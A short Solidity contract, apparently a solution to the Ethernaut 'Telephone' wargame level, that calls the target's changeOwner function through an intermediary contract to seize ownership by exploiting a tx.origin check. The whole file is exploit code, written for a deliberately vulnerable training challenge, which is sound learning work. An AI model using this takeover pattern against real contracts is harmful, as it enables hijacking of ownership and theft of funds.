//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import 'Ethernaut5.sol';

contract AttackTelephone{

    Telephone public telephone;

    constructor(address _telephoneaddress)
    {
        telephone=Telephone(_telephoneaddress);
    }
    
    function letsattack() public{
        telephone.changeOwner(msg.sender);
    }
}